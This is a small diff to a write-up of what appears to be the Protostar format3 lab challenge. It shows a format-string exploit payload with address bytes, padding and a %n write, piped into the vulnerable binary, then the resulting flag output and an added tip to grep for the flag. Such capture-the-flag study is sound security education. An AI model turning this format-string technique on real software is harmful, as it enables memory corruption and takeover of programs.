@@ -118,3 +118,8 @@ python -c "print '????\x04\x08'+'%c'*13+'%.16930099x'+'%n'" | ./format3
 you have modified the target correctly :)
 flag: hello world!
 ```
+
+To avoid waiting you can do 
+```bash
+python -c "print ...." | ./format3 | grep -a flag
+```
